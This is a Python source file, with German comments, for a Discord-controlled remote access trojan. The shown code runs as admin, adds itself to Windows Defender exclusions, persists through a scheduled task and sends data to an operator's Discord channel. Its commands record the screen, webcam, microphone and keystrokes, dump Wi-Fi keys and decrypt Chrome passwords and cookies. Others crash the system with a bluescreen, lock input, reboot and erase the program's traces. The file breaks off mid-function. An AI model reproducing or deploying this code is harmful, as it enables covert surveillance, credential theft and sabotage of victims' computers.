import subprocess
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from re import findall
from discord import Embed
from PIL import Image  
import screeninfo
import mss
import PIL
import os
import datetime
import tempfile
import shutil
import sys
import win32com.client
import discord
import socket
import pyautogui
import platform
import ctypes
import cv2
import requests
from discord.ext import commands
import asyncio
import time
import sounddevice as sd
import numpy as np
import wavio  # Zum Speichern von Audio
from screeninfo import get_monitors
import threading
import sqlite3
import psutil
from datetime import datetime
from pynput import keyboard
from send2trash import send2trash
from threading import Thread
from datetime import datetime
import base64
from urllib.request import Request, urlopen
import win32crypt
import apsw
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from os import getenv, listdir
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import scrypt
from cryptography.hazmat.backends import default_backend
from pynput import mouse, keyboard
from win32crypt import CryptUnprotectData

TOKEN = 'Dein Token'
MAX_FILE_SIZE = 7.5 * 1024 * 1024  # 7,5 MB in Bytes

def is_admin():
    """Prüft, ob das Skript mit Admin-Rechten läuft."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def relaunch_from_appdata():
    """Verschiebt das Skript nach AppData und startet es neu."""
    appdata_path = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    target_path = os.path.join(appdata_path, os.path.basename(exe_path))

    if exe_path != target_path:  # Wenn das Skript nicht im AppData-Ordner ist
        try:
            print(f"Verschiebe Datei nach: {target_path}")
            shutil.move(exe_path, target_path)
            print("Datei erfolgreich verschoben. Starte neu...")
            # Neustart der verschobenen Datei
            subprocess.Popen([target_path], shell=True)
            sys.exit(0)  # Beende die alte Instanz
        except Exception as e:
            print(f"Fehler beim Verschieben: {e}")
            sys.exit(1)

def add_to_windows_defender_exclusions(file_path):
    """Fügt die aktuelle Datei zu den Windows Defender-Ausnahmen hinzu."""
    try:
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{file_path}\'"'
        subprocess.run(command, shell=True, check=True)
        print(f"{file_path} wurde zu den Windows Defender-Ausnahmen hinzugefügt.")
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Hinzufügen zu den Windows Defender-Ausnahmen: {e}")

def create_task_scheduler_entry():
    """Erstellt einen Task im Taskplaner, um das Programm automatisch beim Start auszuführen."""
    task_name = "MyAppAutoStart"
    appdata_path = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
    exe_path = os.path.join(appdata_path, os.path.basename(sys.executable))
    
    command = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f /it'
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Taskplaner-Eintrag erfolgreich erstellt: {task_name}")
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Erstellen des Taskplaner-Eintrags: {e}")
        sys.exit(1)

def main():
    # Admin-Check
    if not is_admin():
        print("Das Programm muss mit Admin-Rechten ausgeführt werden.")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
        sys.exit()

    # Prüfe und führe das Skript aus AppData aus, falls nötig
    relaunch_from_appdata()

    # Windows Defender-Ausnahme hinzufügen
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    add_to_windows_defender_exclusions(exe_path)

    # Taskplaner-Eintrag erstellen
    create_task_scheduler_entry()

    # Der Rest des Programms
    print("Das Skript läuft jetzt unsichtbar im Hintergrund und startet automatisch!")
    # Hier kommt dein Programmcode hin

if __name__ == "__main__":
    main()

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)
local_pc_name = socket.gethostname()

@bot.event
async def on_ready():
    # IP-Adresse des PCs abrufen
    local_ip_address = socket.gethostbyname(local_pc_name)

    # Datei-Name ermitteln
    if getattr(sys, 'frozen', False):  # Prüfen, ob es als .exe ausgeführt wird
        local_filename = os.path.basename(sys.executable)
    else:  # Wenn als .py ausgeführt
        local_filename = os.path.basename(__file__)

    # Windows-Version ermitteln
    system_version = platform.system()
    version_details = platform.version()
    if system_version == "Windows":
        if version_details.startswith("10"):
            windows_version = "Windows 10"
        elif version_details.startswith("10") and int(version_details.split(".")[2]) >= 22000:
            windows_version = "Windows 11"
        else:
            windows_version = "Unbekannte Windows-Version"
    else:
        windows_version = "Nicht Windows"

    # Anzahl der Bildschirme
    number_of_screens = len(get_monitors())

    # Verbindungstyp bestimmen
    try:
        network_adapters = psutil.net_if_addrs()
        is_wifi = any("Wi-Fi" in adapter for adapter in network_adapters)
        is_lan = any("Ethernet" in adapter for adapter in network_adapters)
    except Exception:
        is_wifi = False
        is_lan = False

    connection_type = "WLAN" if is_wifi else "LAN" if is_lan else "Unbekannt"

    # Webcam-Status prüfen
    try:
        webcam_enabled = cv2.VideoCapture(0).isOpened()
        cv2.VideoCapture(0).release()  # Webcam nach dem Testen freigeben
    except Exception:
        webcam_enabled = False

    # VPN-Status (Dummy-Check, erweiterbar)
    vpn_enabled = False

    # Discord-Kanal abrufen
    channel = bot.get_channel(Deine Kanal ID)  # Kanal-ID anpassen
    if channel:
        embed = discord.Embed(
            title=f"PC-Status: {local_pc_name}",
            description="Hier sind die Details zum aktuellen PC.",
            color=discord.Color.green()
        )
        embed.add_field(name="PC Name", value=local_pc_name, inline=False)
        embed.add_field(name="IP-Adresse", value=local_ip_address, inline=False)
        embed.add_field(name="Dateiname", value=local_filename, inline=False)
        embed.add_field(name="Windows Version", value=windows_version, inline=False)
        embed.add_field(name="Anzahl der Bildschirme", value=str(number_of_screens), inline=False)
        embed.add_field(name="Webcam", value="Ja" if webcam_enabled else "Nein", inline=False)
        embed.add_field(name="Verbindung", value=connection_type, inline=False)
        embed.add_field(name="VPN", value="Ja" if vpn_enabled else "Nein", inline=False)

        await channel.send(embed=embed)

@bot.command()
async def test(ctx):
    await ctx.send(f"Der PC: {local_pc_name} ist Online")

def leere_papierkorb():
    try:
        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000001)
    except Exception:
        pass

@bot.command()
async def kill(ctx, *, pc_name: str):
    if pc_name == local_pc_name:
        try:
            # Der Pfad zur Batch-Datei
            startup_folder = os.path.join(os.environ.get("APPDATA"), 
                                          "Microsoft", "Windows", 
                                          "Start Menu", "Programs", "Startup")
            batch_file_path = os.path.join(startup_folder, "start_myapp.bat")

            if os.path.exists(batch_file_path):
                os.remove(batch_file_path)
                await ctx.send(f"Die Autostart-Batch-Datei wurde erfolgreich gelöscht: {batch_file_path}")
            else:
                await ctx.send(f"Autostart-Batch-Datei wurde nicht gefunden: {batch_file_path}")

            # Der Pfad zur ausführbaren Datei
            exe_file_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            if os.path.exists(exe_file_path):
                await ctx.send(f"Die ausführbare Datei wird gelöscht: {exe_file_path}")
                delete_cmd = f'cmd /c timeout 3 & del "{exe_file_path}"'
                subprocess.Popen(delete_cmd, shell=True)
            else:
                await ctx.send(f"Die Datei wurde nicht gefunden: {exe_file_path}")

            # Hier kannst du die Funktion zum Leeren des Papierkorbs aufrufen
            leere_papierkorb()

            await ctx.send("Alle Dateien wurden gelöscht und der Papierkorb wurde geleert. Der Bot wird jetzt heruntergefahren.")
            sys.exit(0)

        except Exception as e:
            await ctx.send(f"Fehler beim Löschen der Dateien: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def userinfo(ctx, *, pc_name: str):
    if pc_name != local_pc_name:
        await ctx.send(f"Dieser Befehl ist nur für den PC `{local_pc_name}` verfügbar.")
        return
    
    try:
        # CPU-Informationen
        cpu_freq = psutil.cpu_freq()
        cpu_info = f"CPU-Frequenz: {cpu_freq.current:.2f} MHz"

        # GPU-Informationen
        try:
            nvmlInit()
            handle = nvmlDeviceGetHandleByIndex(0)
            gpu_info = nvmlDeviceGetName(handle).decode('utf-8')
            nvmlShutdown()
        except Exception:
            gpu_info = "GPU-Informationen konnten nicht abgerufen werden."

        # RAM-Informationen
        ram = psutil.virtual_memory()
        total_ram_gb = ram.total // (1024 ** 3)
        ram_info = f"Gesamter RAM: {total_ram_gb} GB"

        # Systeminformationen in einem Embed zusammenstellen
        embed = discord.Embed(
            title=f"Systeminformationen für {local_pc_name}",
            color=discord.Color.green()
        )
        embed.add_field(name="CPU", value=cpu_info, inline=False)
        embed.add_field(name="GPU", value=gpu_info, inline=False)
        embed.add_field(name="RAM", value=ram_info, inline=False)
        embed.set_footer(text="Systeminfo-Bot")
        
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Fehler beim Abrufen der Systeminformationen: {e}")

@bot.command()
async def screenshot(ctx):
    try:
        # Dynamischer PC-Name
        pc_name = socket.gethostname()  # Hole den PC-Namen

        # Initialisiere mss, um alle Bildschirme zu erfassen
        with mss.mss() as sct:
            monitors = sct.monitors  # Alle Monitore

            # Liste für die Screenshot-Dateien
            screenshot_paths = []

            # Screenshot für jeden Monitor aufnehmen
            for i, monitor in enumerate(monitors[1:], start=1):  # Monitor 0 ist der Hauptmonitor
                screenshot = sct.grab(monitor)

                # Konvertiere das Screenshot-Objekt in ein PIL-Bild
                image = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)

                # Speichern des Screenshots
                screenshot_path = f"screenshot_{pc_name}_monitor_{i}.png"
                image.save(screenshot_path)
                screenshot_paths.append(screenshot_path)

                # Erstelle Embed für jeden Monitor
                embed = Embed(
                    title=f"Monitor {i} - {pc_name}",
                    description=f"Auflösung: {screenshot.width}x{screenshot.height}",
                    color=0x00ff00
                )
                
                # Füge das Bild zum Embed hinzu
                embed.set_image(url=f"attachment://{os.path.basename(screenshot_path)}")

                # Sende das Embed mit dem Screenshot als Anhang
                await ctx.send(embed=embed, files=[discord.File(screenshot_path)])

            # Lösche alle temporären Dateien nach dem Senden
            for screenshot_path in screenshot_paths:
                os.remove(screenshot_path)

    except Exception as e:
        await ctx.send(f"Fehler beim Erstellen des Screenshots: {e}")

@bot.command()
async def webcam(ctx, pc_name: str = None):  # Erwarte eine optionale Eingabe des PC-Namens
    try:
        # Dynamischer PC-Name (vom Host-PC)
        local_pc_name = socket.gethostname()

        # Wenn kein PC-Name angegeben wird, verwenden wir den aktuellen PC-Namen
        if not pc_name:
            pc_name = local_pc_name

        # Überprüfen, ob der Befehl auf dem richtigen PC ausgeführt wird
        if local_pc_name != pc_name:
            await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")
            return

        # Webcam öffnen
        cap = cv2.VideoCapture(0)  # 0 ist die standardmäßige Webcam

        if not cap.isOpened():
            await ctx.send("Webcam konnte nicht geöffnet werden.")
            return

        # Ein Bild von der Webcam aufnehmen
        ret, frame = cap.read()

        if not ret:
            await ctx.send("Fehler beim Aufnehmen des Webcam-Bildes.")
            cap.release()
            return

        # Bild speichern
        webcam_image_path = f"webcam_{local_pc_name}.png"
        cv2.imwrite(webcam_image_path, frame)

        # Embed-Nachricht erstellen
        embed = Embed(
            title=f"Webcam-Bild von {local_pc_name}",
            description="Hier ist das aktuelle Webcam-Bild:",
            color=0x00ff00
        )

        # Füge das Bild zum Embed hinzu
        embed.set_image(url=f"attachment://{os.path.basename(webcam_image_path)}")

        # Sende das Bild in einer Embed-Nachricht
        await ctx.send(embed=embed, files=[discord.File(webcam_image_path)])

        # Webcam und die Datei freigeben
        cap.release()

        # Lösche die temporäre Bilddatei nach dem Senden
        os.remove(webcam_image_path)

    except Exception as e:
        await ctx.send(f"Fehler beim Erstellen des Webcam-Bildes: {e}")

@bot.command()
async def location(ctx, pc_name: str):
    if pc_name == local_pc_name:
        try:
            response = requests.get("https://ipinfo.io/json")
            data = response.json()
            loc = data.get("loc", "Standort konnte nicht ermittelt werden.")
            latitude, longitude = loc.split(",")
            await ctx.send(f"Längengrad: {longitude}, Breitengrad: {latitude}")
        except Exception as e:
            await ctx.send(f"Fehler beim Ermitteln des Standorts: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def closeprossec(ctx, pc_name: str, process_name: str):
    if pc_name == local_pc_name:
        try:
            # Überprüfe, ob der Prozess läuft
            result = subprocess.check_output(f'tasklist | findstr /i "{process_name}"', shell=True).decode()

            if process_name.lower() in result.lower():
                # Schließe den Prozess
                subprocess.call(f'taskkill /f /im {process_name}', shell=True)
                await ctx.send(f"Der Prozess {process_name} wurde erfolgreich auf {local_pc_name} geschlossen.")
            else:
                await ctx.send(f"Der Prozess {process_name} läuft nicht auf {local_pc_name}.")
        except subprocess.CalledProcessError:
            await ctx.send(f"Der Prozess {process_name} wurde nicht gefunden oder konnte nicht geschlossen werden.")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def bluescreen(ctx, pc_name: str):
    if pc_name == local_pc_name:
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except Exception as e:
            await ctx.send(f"Fehler bei der Ausführung: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def wlaninfo(ctx, *, pc_name: str):
    if pc_name == local_pc_name:
        try:
            # WLAN-Profile auslesen
            profiles_output = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8')
            profiles = [line.split(":")[1].strip() for line in profiles_output.split('\n') if "All User Profile" in line]

            if not profiles:
                await ctx.send("Es wurden keine WLAN-Profile gefunden.")
                return

            wlan_info = ""
            for profile in profiles:
                # Passwort für jedes WLAN-Profil auslesen
                profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('utf-8')
                ssid = profile
                password_line = [line for line in profile_info.split('\n') if "Key Content" in line]
                password = password_line[0].split(":")[1].strip() if password_line else "Kein Passwort gespeichert"

                wlan_info += f"WLAN-Name (SSID): {ssid}\nPasswort: {password}\n\n"

            await ctx.send(f"WLAN-Informationen:\n{wlan_info}")
        except Exception as e:
            await ctx.send(f"Fehler beim Abrufen der WLAN-Informationen: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def laninfo(ctx, *, pc_name: str):
    if pc_name == local_pc_name:
        try:
            # Informationen zur LAN-Verbindung abrufen
            lan_info_output = subprocess.check_output('ipconfig', shell=True).decode('utf-8')
            lan_info_lines = [line.strip() for line in lan_info_output.split('\n') if "Ethernet" in line or "IPv4" in line]

            lan_info = "\n".join(lan_info_lines)

            if not lan_info:
                await ctx.send("Es wurde keine LAN-Verbindung gefunden.")
            else:
                await ctx.send(f"LAN-Informationen:\n{lan_info}")
        except Exception as e:
            await ctx.send(f"Fehler beim Abrufen der LAN-Informationen: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def tts(ctx, pc_name: str, message: str, repeats: int):
    if pc_name == local_pc_name:  # Überprüfen, ob der Befehl auf dem richtigen PC ausgeführt wird
        try:
            await ctx.send(f"Text-to-Speech wird gestartet: '{message}' (Wiederholungen: {repeats})")
            for _ in range(repeats):
                subprocess.call(f'powershell -Command "Add-Type –AssemblyName System.Speech; ' 
                                f'$synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer; ' 
                                f'$synthesizer.Speak(\'{message}\');"', shell=True)
                await asyncio.sleep(2)  # 2 Sekunden Pause zwischen den Nachrichten
        except Exception as e:
            await ctx.send(f"Fehler bei der Text-to-Speech-Ausgabe: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def popup(ctx, pc_name: str, message: str, count: int):
    if pc_name == local_pc_name:
        await ctx.send(f"{count} Pop-ups werden jetzt geöffnet!")
        for _ in range(count):
            ctypes.windll.user32.MessageBoxW(0, message, "Troll Pop-up", 1)
            await asyncio.sleep(1)  # Kurze Pause zwischen den Pop-ups
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def recaudio(ctx, *, pc_name: str):
    if pc_name == local_pc_name:
        try:
            await ctx.send("Aufnahme startet...")

            duration = 30  # Dauer in Sekunden
            samplerate = 44100  # Standard-Samplerate
            myrecording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1)  # Mono-Audio
            sd.wait()  # Warten bis die Aufnahme abgeschlossen ist

            audio_path = 'audioclip.wav'
            wavio.write(audio_path, myrecording, samplerate, sampwidth=3)  # Speichern als WAV-Datei

            await ctx.send(file=discord.File(audio_path))
            os.remove(audio_path)  # Datei nach dem Senden löschen

        except Exception as e:
            await ctx.send(f"Fehler bei der Audioaufnahme: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

def block_input():
    """Blockiert sowohl Tastatur- als auch Maus-Eingaben."""
    def on_press(key):
        return False  # Blockiert alle Tastatureingaben

    def on_move(x, y):
        return False  # Blockiert Mausbewegungen

    def on_click(x, y, button, pressed):
        return False  # Blockiert Maus-Klicks

    # Erstelle und starte Listener für Tastatur und Maus
    with keyboard.Listener(on_press=on_press) as kl, mouse.Listener(on_move=on_move, on_click=on_click) as ml:
        kl.start()
        ml.start()

        # Halte die Listener am Laufen, bis is_locked auf False gesetzt wird
        while is_locked:
            time.sleep(0.1)  # Überprüfe alle 100 ms, ob der Listener weiterläuft

        # Stoppe den Listener, wenn is_locked False ist
        kl.stop()
        ml.stop()

def unlock_input():
    """Stoppt den Listener, um Eingaben zu erlauben."""
    pass  # Der Listener wird im Hintergrund gestoppt, wenn is_locked auf False gesetzt wird

@bot.command()
async def lock(ctx, pc_name: str):
    global locked_windows, is_locked  # Um auf die globale Variable zuzugreifen
    if pc_name == local_pc_name:
        try:
            if not is_locked:
                # Starte den Blockierer in einem separaten Thread
                lock_thread = Thread(target=block_input)
                lock_thread.daemon = True  # Thread läuft im Hintergrund und wird beim Programmende beendet
                lock_thread.start()

                # Erhalte die Monitorinformationen
                monitors = get_monitors()

                for index, monitor in enumerate(monitors):
                    # Erstelle ein Bild mit schwarzem Hintergrund und passe es der Monitorauflösung an
                    img = np.zeros((monitor.height, monitor.width, 3), dtype=np.uint8)
                    img[:] = (0, 0, 0)  # Schwarz als Hintergrund

                    # Text für „PC LOCKED“
                    text = 'PC LOCKED'
                    font = cv2.FONT_HERSHEY_SIMPLEX
                    font_scale = 5
                    font_thickness = 10

                    # Berechne die Größe des Textes
                    text_size = cv2.getTextSize(text, font, font_scale, font_thickness)[0]
                    # Berechne die Position für zentrierten Text
                    text_x = (monitor.width - text_size[0]) // 2
                    text_y = (monitor.height + text_size[1]) // 2  # Für vertikales Zentrieren

                    # Zeichne den Text auf das Bild
                    cv2.putText(img, text, (text_x, text_y), font, font_scale, (255, 255, 255), font_thickness, cv2.LINE_AA)

                    # Erstelle ein Fenster für jeden Monitor im Vollbildmodus
                    window_name = f'PC LOCKED - Monitor {index + 1}'
                    cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
                    cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)

                    # Setze das Fenster an die Position des Monitors
                    cv2.moveWindow(window_name, monitor.x, monitor.y)

                    # Stelle sicher, dass das Fenster immer im Vordergrund bleibt
                    cv2.setWindowProperty(window_name, cv2.WND_PROP_TOPMOST, 1)

                    # Zeige das Bild an
                    cv2.imshow(window_name, img)

                    # Speichere das Fenster, um es später zu schließen
                    locked_windows[window_name] = img

                cv2.waitKey(1)  # Ersetze 0 durch 1, um kontinuierliche Ausführung zu gewährleisten
                is_locked = True
            else:
                await ctx.send(f"PC '{local_pc_name}' ist bereits gesperrt.")
        except Exception as e:
            await ctx.send(f"Fehler beim Sperren des PCs: {e}")
    else:
        await ctx.send(f"Dieser Befehl ist für den PC {local_pc_name} vorgesehen, nicht für {pc_name}.")

@bot.command()
async def unlock(ctx):
    global locked_windows, is_locked  # Um auf die globale Variable zuzugreifen
    try:
        if is_locked:
            for window_name in list(locked_windows.keys()):
                # Schließe jedes gesperrte Fenster
                cv2.destroyWindow(window_name)
            
            locked_windows.clear()  # Lösche alle gespeicherten Fenster
            is_locked = False  # PC ist jetzt entsperrt

            await ctx.send(f"PC '{local_pc_name}' wurde entsperrt.")
        else:
            await ctx.send(f"Der PC ist nicht gesperrt.")
    except Exception as e:
        await ctx.send(f"Fehler beim Entsperren des PCs: {e}")

# Funktion für Bildschirmaufnahme
def record_screen(output_path, duration=30, fps=10, scale_factor=0.5):
    with mss() as sct:
        monitors = sct.monitors[1:]  # Überspringe Monitor 0 (Gesamtübersicht)
        if not monitors:
            raise RuntimeError("Keine Monitore gefunden.")

        # Gesamtauflösung aller Monitore bestimmen
        total_width = int(sum(monitor["width"] for monitor in monitors))
        max_height = int(max(monitor["height"] for monitor in monitors))

        # Reduzierte Auflösung
        total_width = int(total_width * scale_factor)
        max_height = int(max_height * scale_factor)

        # Videodatei vorbereiten
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        fps = int(fps)  # Stelle sicher, dass fps ein Integer ist
        out = cv2.VideoWriter(output_path, fourcc, fps, (total_width, max_height))

        start_time = time.time()
        while time.time() - start_time < int(duration):  # Konvertiere Dauer in Integer
            frame = np.zeros((max_height, total_width, 3), dtype=np.uint8)
            current_x = 0

            for monitor in monitors:
                screenshot = np.array(sct.grab(monitor))
                resized_frame = cv2.resize(
                    screenshot[:, :, :3],
                    (int(monitor["width"] * scale_factor), int(monitor["height"] * scale_factor))
                )
                frame[:resized_frame.shape[0], current_x:current_x + resized_frame.shape[1]] = resized_frame
                current_x += resized_frame.shape[1]

            out.write(frame)

        out.release()

# Funktion zum Teilen der Datei
def split_file(file_path, chunk_size=MAX_FILE_SIZE):
    parts = []
    with open(file_path, 'rb') as f:
        while chunk := f.read(int(chunk_size)):
            parts.append(chunk)
    return parts

# Discord-Befehl für Bildschirmaufnahme
@bot.command()
async def recdesktop(ctx, pc_name: str):
    # Prüfen, ob der PC-Name übereinstimmt
    if pc_name.strip() != local_pc_name:
        await ctx.send(f"Dieser Befehl ist nur für den PC '{local_pc_name}' verfügbar.")
        return

    try:
        # Speicherort und Dateiname der Bildschirmaufnahme
        script_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(script_dir, 'screen_recording.mp4')

        # Nachricht senden, dass die Aufnahme gestartet wird
        await ctx.send(f"Starte die Bildschirmaufnahme für 30 Sekunden auf '{pc_name}'...")

        # Bildschirmaufnahme starten
        record_screen(output_path)

        # Nachricht senden, dass die Aufnahme beendet wurde
        await ctx.send("Die Bildschirmaufnahme wurde abgeschlossen. Datei wird gesendet...")

        # Datei in Blöcke von 7,5 MB teilen
        file_parts = split_file(output_path)
        file_name = os.path.basename(output_path)

        # Alle Teile der Datei an Discord senden
        for i, part in enumerate(file_parts, start=1):
            part_name = f"{file_name}.part{i}"
            with open(part_name, 'wb') as part_file:
                part_file.write(part)

            # Teil hochladen
            await ctx.send(file=discord.File(part_name))

            # Nach dem Hochladen das Teil löschen
            os.remove(part_name)

        # Originaldatei löschen
        os.remove(output_path)

        # Abschlussnachricht
        await ctx.send("Alle Teile wurden erfolgreich gesendet!")
    except Exception as e:
        # Fehlernachricht senden
        await ctx.send(f"Fehler beim Ausführen des Befehls: {str(e)}")

@bot.command()
async def reboot(ctx):
    await ctx.send("PC wird neu gestartet.")
    subprocess.call('shutdown /r /f /t 0', shell=True)

LOG_FILE = "key_logs.txt"  # Name der Datei für die Tasteneingaben


intents = discord.Intents.default()  # Intents einrichten
intents.messages = True  # Erlaubt das Empfangen von Nachrichten
key_logs = []
is_logging = False  # Globale Variable für den Logging-Status

def on_press(key):
    try:
        key_logs.append(f'Alphanumeric key pressed: {key.char}')
    except AttributeError:
        key_logs.append(f'Special key pressed: {key}')
    print(f'Taste gedrückt: {key}')  # Protokolliere die gedrückte Taste

def start_logging():
    global is_logging
    is_logging = True
    print("Starte Logging...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Hält den Listener aktiv
    is_logging = False  # Setze is_logging auf False, wenn der Listener gestoppt wird
    print("Logging beendet.")

def save_logs_to_file():
    with open(LOG_FILE, "w") as file:
        for log in key_logs:
            file.write(log + "\n")
    key_logs.clear()

async def send_logs(ctx):
    with open(LOG_FILE, "rb") as file:
        await ctx.send("Hier sind die gesammelten Tastenanschläge:", file=discord.File(file, LOG_FILE))
    send2trash(LOG_FILE)
    print(f"{LOG_FILE} wurde in den Papierkorb verschoben.")

@bot.command()
async def keyloggerstat(ctx):
    global is_logging
    if not is_logging:
        logging_thread = threading.Thread(target=start_logging)
        logging_thread.start()
        await ctx.send("Keylogger gestartet!")
    else:
        await ctx.send("Keylogger läuft bereits.")

@bot.command()
async def keyloggerstop(ctx):
    global is_logging
    if is_logging:
        is_logging = False  
        time.sleep(1)
        save_logs_to_file()
        await send_logs(ctx)
    else:
        await ctx.send("Keylogger ist nicht aktiv.")

# Hilfsfunktion zum Erstellen und Senden von Dateien
async def send_file(ctx, file_name, content):
    try:
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(content)
        await ctx.send(file=discord.File(file_name))
        os.remove(file_name)
    except Exception as e:
        await ctx.send(f"Fehler beim Erstellen oder Senden der Datei: {str(e)}")

@bot.command()
async def passwords(ctx):
    try:
        passwords_data = get_chrome_passwords()
        if not passwords_data:
            await ctx.send("Keine gespeicherten Passwörter gefunden.")
        else:
            file_name = "passwords.txt"
            with open(file_name, "w", encoding="utf-8") as f:
                for pwd in passwords_data:
                    f.write(f"URL: {pwd['url']}\nBenutzername: {pwd['username']}\nPasswort: {pwd['password']}\n\n")
            await ctx.send(file=discord.File(file_name))  # Sende die Datei an den Discord-Channel
            os.remove(file_name)  # Lösche die Datei nach dem Versand
    except Exception as e:
        await ctx.send(f"Fehler beim Abrufen der Passwörter: {str(e)}")

# Funktion, um Passwörter von Chrome zu extrahieren
def get_chrome_passwords():
    passwords = []
    try:
        key = get_encryption_key()
        login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
        if os.path.exists(login_data_path):
            conn, temp_path = copy_and_access_db(login_data_path)  # Datenbank öffnen
            if conn:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                for row in rows:
                    url, username, encrypted_password = row
                    password = decrypt_value(encrypted_password, key) if key else "Nicht entschlüsselbar"
                    passwords.append({"url": url, "username": username, "password": password.decode('utf-8', errors='ignore')})
                conn.close()
                os.remove(temp_path)  # Temporäre Kopie der DB löschen
    except Exception as e:
        passwords.append({"url": "Fehler", "username": "Fehler", "password": str(e)})
    return passwords

# Funktion zum Abrufen des Entschlüsselungsschlüssels
def get_encryption_key():
    try:
        local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encryption_key"])
        return key
    except Exception as e:
        return None

# Funktion zum Entschlüsseln der Passwörter
def decrypt_value(encrypted_value, key):
    try:
        cipher = Cipher(algorithms.AES(key), modes.GCM(encrypted_value[3:15]))
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted_value[15:]).decode('utf-8', errors='ignore')
    except Exception as e:
        return "Entschlüsselung fehlgeschlagen"

# Befehl, um Cookies abzurufen
@bot.command()
async def cookies(ctx, pc_name: str):
    # Den übergebenen PC-Namen trimmen
    pc_name = pc_name.strip()

    # Debugging-Ausgabe (Falls nötig, zum Überprüfen der Namen)
    print(f"Lokaler PC-Name: {local_pc_name}, Übergebener PC-Name: {pc_name}")

    # Wenn der PC-Name nicht übereinstimmt, den Befehl verweigern
    if pc_name != local_pc_name:
        await ctx.send(f"Dieser Befehl ist nur für den lokalen PC '{local_pc_name}' verfügbar.")
        return

    try:
        # Rufe die Cookies ab
        cookies_data = get_browser_cookies(pc_name)

        # Falls keine Cookies gefunden wurden
        if isinstance(cookies_data, str):
            await ctx.send(cookies_data)
        else:
            # Speichern der Cookies in eine Datei
            file_name = f"browser_cookies_{pc_name}.txt"
            with open(file_name, "w", encoding="utf-8") as f:
                for line in cookies_data:
                    f.write(line + "\n")
            await ctx.send(file=discord.File(file_name))  # Sende die Datei an den Discord-Channel
            os.remove(file_name)  # Lösche die Datei nach dem Versand
    except Exception as e:
        await ctx.send(f"Fehler beim Abrufen der Cookies: {str(e)}")

# Funktion, um die Cookies aus Chrome zu extrahieren
def get_browser_cookies(pc_name: str):
    cookies = []

    # Nur für den lokalen PC
    if pc_name != local_pc_name:
        return f"Dieser Befehl ist nur für den lokalen PC '{local_pc_name}' verfügbar."

    try:
        # Pfad zur Chrome-Cookies-Datenbank
        chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Cookies")

        # Überprüfe, ob die Datei existiert
        if os.path.exists(chrome_path):
            conn, temp_path = copy_and_access_db(chrome_path)  # Hier wird die Datenbank geöffnet
            if conn:
